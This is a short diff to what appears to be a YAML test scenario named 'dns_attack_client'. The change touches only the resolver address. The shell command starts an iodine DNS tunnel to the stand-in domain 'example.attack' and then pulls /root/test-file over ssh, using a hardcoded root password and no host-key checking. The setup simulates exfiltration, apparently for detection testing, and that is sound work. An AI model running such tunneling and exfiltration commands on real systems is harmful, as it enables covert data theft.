@@ -27,7 +27,7 @@ dns_attack_client:
     run:
         type: shell
         val: |-
-          set -x; (iodine -4 -f -P {{ variables.passphrase }} -T{{ variables.record_type }} -O{{ variables.encoding }} -r 192.168.0.10 example.attack) & sleep 20; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no" 10.0.0.1:/root/test-file /tmp/
+          set -x; (iodine -4 -f -P {{ variables.passphrase }} -T{{ variables.record_type }} -O{{ variables.encoding }} -r 127.0.0.1 example.attack) & sleep 20; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no" 10.0.0.1:/root/test-file /tmp/
 
     artifacts_to_collect:
       - type: files
